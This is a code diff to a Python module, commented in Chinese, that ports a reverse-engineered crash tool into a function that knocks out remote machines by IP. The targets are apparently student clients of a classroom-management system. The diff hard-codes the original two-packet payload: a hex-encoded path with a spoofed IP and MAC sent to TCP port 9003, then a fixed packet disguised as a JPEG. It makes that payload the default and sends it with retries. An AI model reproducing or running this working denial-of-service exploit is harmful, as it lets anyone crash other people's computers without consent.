@@ -6,10 +6,13 @@
 #   - 实现：WSAStartup -> 创建 TCP socket -> connect(<ip>) -> 发送 payload
 #   - 反汇编证据：Kill target: %s / [*]Sending Test Payload... / Connection code %d
 #
-# 本模块用纯 Python/socket 复刻同一套"按 IP 发送载荷触发远端崩溃"流程，
-# 并把"载荷内容""目标端口"开放为可配置参数。
+# 本模块用纯 Python/socket 复刻同一套"按 IP 发送载荷触发远端崩溃"流程。
+# 默认载荷已按原版还原：TCP 连 9003 → 发送 hex 编码的
+#   /<rand>/<rand>/<rand>//24/0/0/<伪造IP>/<伪造MAC>/  + JPEG 头伪装包。
+# 也支持用户自定义载荷（留空即用原版）。
 
 import ipaddress
+import random
 import socket
 import time
 
@@ -18,21 +21,63 @@ from src.utils.logger import info, warn, error, debug
 # 目标端口（学生端监听的控制通道，实测 ConnectPort=9003 可触发崩溃）
 DEFAULT_PORT = 9003
 DEFAULT_TIMEOUT = 3.0    # 连接/收发超时
-# 发送到目标机的崩溃/控制指令载荷（原版通过自定义协议；此处开放给配置）
-DEFAULT_PAYLOAD = b"oshack\r\n"
+
+# ── 原版载荷（逆向自 oseasycrasher.exe / 资源 CRASHER） ─────────────────────
+# 原版流程（oseasycrasher.exe <ip>）：
+#   1) 生成 5 个随机字母数字字符 + 随机伪造源 IP + 随机伪造 MAC
+#   2) 组包： /<c1>/<c2>/<c3>//24/0/0/<spoofIP>/<spoofMAC>/
+#   3) 对该字符串逐字节做 hex 编码，作为 TCP 第一包发送（端口 9003）
+#   4) 再发送第二包：JPEG 头(ffd8ff)伪装的固定 hex 串
+# 见反编译 FUN_1400013f0（构造）/ FUN_140001130（socket→connect(9003)→send×2→recv）。
+_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+# 第二包：原版中的固定 JPEG 头伪装包（已是 hex 文本，原样发送）
+JPEG_PAYLOAD_HEX = (
+    b"180500002b000000400000000000000008050000ffd8ffe000104a464946"
+    b"00010101006000600000ffdb004300140e0f120f0d14121112171614181f"
+    b"33211f1c1c1f3f2d2f25334a414e4d49414846525c766452576f5846486"
+    b"fffffffff"
+)
+
+# 默认载荷哨兵：表示"使用原版动态载荷"（每次发送时随机生成）
+ORIGINAL_PAYLOAD = b"__OSEASY_ORIGINAL__"
+DEFAULT_PAYLOAD = ORIGINAL_PAYLOAD
+
+
+def build_original_payload() -> bytes:
+    """按 oseasycrasher.exe 的原版算法生成第一包载荷。
+
+    生成：/<c1>/<c2>/<c3>//24/0/0/<伪造IP>/<伪造MAC>/
+    再逐字节 hex 编码（小写），返回其 ASCII 字节。
+
+    Returns:
+        原版第一包的原始字节（hex 文本）。
+    """
+    c1, c2, c3 = (random.choice(_CHARSET) for _ in range(3))
+    spoof_ip = "%d.%d.%d.%d" % tuple(random.randint(0, 255) for _ in range(4))
+    spoof_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(6)
+    )
+    raw = f"/{c1}/{c2}/{c3}//24/0/0/{spoof_ip}/{spoof_mac}/"
+    return raw.encode("latin1").hex().encode("ascii")
+
+
+def build_original_packets():
+    """返回原版的完整包序列（第一包动态载荷 + 第二包 JPEG 伪装包）。"""
+    return [build_original_payload(), JPEG_PAYLOAD_HEX]
 
 
 def parse_payload(text: str) -> bytes:
     """把用户输入的载荷文本转成原始字节。
 
     支持解释转义序列：\\r \\n \\t \\\\ \\xNN 等；
-    文本为空时返回默认载荷。
+    文本为空时返回默认载荷（= 原版动态载荷哨兵 ORIGINAL_PAYLOAD）。
 
     Args:
         text: 界面输入的载荷字符串。
 
     Returns:
-        对应的原始字节载荷。
+        对应的原始字节载荷；或原版载荷哨兵。
     """
     text = (text or "").strip()
     if not text:
@@ -95,10 +140,18 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
         error(f"远程崩溃：端口无效: {port}")
         return f"{RESULT_FAIL} 端口无效: {port}"
 
+    # 解析载荷：原版哨兵/空 → 使用原版双包；否则用自定义单包
+    if not payload or payload == ORIGINAL_PAYLOAD:
+        payloads = build_original_packets()
+        payload_desc = f"原版载荷({len(payloads)}包: 动态hex + JPEG伪装)"
+    else:
+        payloads = [payload]
+        payload_desc = f"自定义载荷({len(payload)}字节)"
+
     attempts = 1 + max(0, int(retries))
     for attempt in range(1, attempts + 1):
         debug(f"远程崩溃 尝试[{attempt}/{attempts}] → 目标 {ip}:{port}，"
-              f"载荷 {len(payload)} 字节 [{payload!r}]，超时 {timeout}s")
+              f"{payload_desc}，超时 {timeout}s")
         t0 = time.perf_counter()
         try:
             sock = socket.create_connection((ip, port), timeout=timeout)
@@ -125,10 +178,11 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
             warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
             return f"{RESULT_FAIL} 连接 {ip}:{port} 失败: {exc}"
 
-        # 连接成功：发送载荷并判定结果
+        # 连接成功：按原版顺序发送载荷包并判定结果
         try:
-            sock.sendall(payload)
-            debug(f"已发送载荷 {len(payload)} 字节到 {ip}:{port}")
+            for idx, pkt in enumerate(payloads, 1):
+                sock.sendall(pkt)
+                debug(f"已发送第 {idx}/{len(payloads)} 包 {len(pkt)} 字节到 {ip}:{port}")
             try:
                 resp = sock.recv(64)
                 if resp:
